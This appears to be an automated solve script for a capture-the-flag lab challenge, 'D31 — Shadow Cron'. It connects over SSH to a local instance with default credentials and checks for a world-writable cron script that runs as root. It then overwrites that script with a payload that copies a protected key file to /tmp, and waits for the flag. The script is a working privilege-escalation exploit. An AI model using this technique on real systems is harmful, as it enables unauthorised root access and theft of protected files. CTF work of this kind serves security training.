#!/usr/bin/env python3
"""
Clean-Room Automated Solve Script for D31 — Shadow Cron
Connects to the challenge SSH instance, injects a payload into the
world-writable root-executed cron script, waits for cron execution,
and reads the flag from the output file.
"""

import sys
import re
import time
import argparse


def solve_ssh(host="127.0.0.1", port=2222, user="operator", password="operator"):
    print(f"[+] Starting D31 solve against {host}:{port} as {user}...")

    def run_ssh_cmd(cmd, timeout=15):
        """Execute a command over SSH, returning (stdout, stderr)."""
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=user, password=password, timeout=10)
            _, stdout, stderr = client.exec_command(cmd, timeout=timeout)
            out = stdout.read().decode("utf-8", errors="ignore")
            err = stderr.read().decode("utf-8", errors="ignore")
            client.close()
            return out, err
        except ImportError:
            import subprocess
            ssh_base = [
                "sshpass", "-p", password,
                "ssh",
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-o", "LogLevel=ERROR",
                "-p", str(port),
                f"{user}@{host}",
                cmd
            ]
            res = subprocess.run(ssh_base, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 text=True, timeout=timeout)
            return res.stdout, res.stderr

    # ─── Step 1: Verify foothold ──────────────────────────────────────────────
    print("[1] Verifying operator SSH foothold...")
    id_out, _ = run_ssh_cmd("id")
    if "operator" not in id_out:
        print(f"[-] SSH connection failed or wrong user. Output: {id_out}")
        return False
    print(f"[+] Foothold confirmed: {id_out.strip()}")

    # ─── Step 2: Confirm the cron job & script location ───────────────────────
    print("[2] Inspecting cron schedule...")
    cron_out, _ = run_ssh_cmd("cat /etc/cron.d/relay-maintenance")
    if "relay_health_check.sh" not in cron_out:
        print(f"[-] Expected cron entry not found. Output: {cron_out}")
        return False
    print(f"[+] Cron schedule confirmed:\n{cron_out.strip()}")

    # ─── Step 3: Confirm world-writable script ────────────────────────────────
    print("[3] Auditing cron script permissions...")
    perm_out, _ = run_ssh_cmd("ls -la /opt/latveria-relay/scripts/relay_health_check.sh")
    print(f"[+] Script permissions: {perm_out.strip()}")
    if "rwxrwxrwx" not in perm_out:
        print("[-] Script is not world-writable. Challenge state may be incorrect.")
        return False
    print("[+] CONFIRMED: Script is world-writable (0777). Escalation vector identified.")

    # ─── Step 4: Inject payload ───────────────────────────────────────────────
    print("[4] Injecting payload into cron script...")
    payload = (
        "printf '#!/bin/bash\\n"
        "cp /opt/latveria-relay/defense_key.txt /tmp/.relay_out\\n"
        "chmod 644 /tmp/.relay_out\\n'"
        " > /opt/latveria-relay/scripts/relay_health_check.sh"
    )
    _, inject_err = run_ssh_cmd(payload)
    if inject_err.strip():
        print(f"[!] Inject stderr: {inject_err.strip()}")

    # Verify injection
    verify_out, _ = run_ssh_cmd("cat /opt/latveria-relay/scripts/relay_health_check.sh")
    print(f"[+] Injected script content:\n{verify_out.strip()}")

    # ─── Step 5: Wait for cron to execute ────────────────────────────────────
    print("[5] Waiting for cron to execute the injected script (max 75 seconds)...")
    flag = None
    for attempt in range(1, 16):
        time.sleep(5)
        flag_out, _ = run_ssh_cmd("cat /tmp/.relay_out 2>/dev/null || echo 'PENDING'")
        if "PENDING" not in flag_out and flag_out.strip():
            print(f"[+] Output file appeared after ~{attempt * 5}s: {flag_out.strip()}")
            flag_match = re.search(r"(YUVA\{[^\}]+\}|FLAG\{[^\}]+\})", flag_out)
            if flag_match:
                flag = flag_match.group(1)
                break
        else:
            print(f"    [{attempt * 5}s] Waiting for cron execution...")

    # ─── Result ───────────────────────────────────────────────────────────────
    print("\n" + "=" * 70)
    if flag:
        print(f"[SUCCESS] Flag Extracted: {flag}")
        print("=" * 70 + "\n")
        return flag
    else:
        print("[-] Flag not found after 75 seconds. Check cron daemon status.")
        print("=" * 70 + "\n")
        return False


def main():
    parser = argparse.ArgumentParser(description="D31 — Shadow Cron Automated Solver")
    parser.add_argument("--host", default="127.0.0.1", help="Target SSH host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=2222, help="Target SSH port (default: 2222)")
    parser.add_argument("--user", default="operator", help="SSH username (default: operator)")
    parser.add_argument("--password", default="operator", help="SSH password (default: operator)")
    args = parser.parse_args()

    result = solve_ssh(args.host, args.port, args.user, args.password)
    sys.exit(0 if result else 1)


if __name__ == "__main__":
    main()
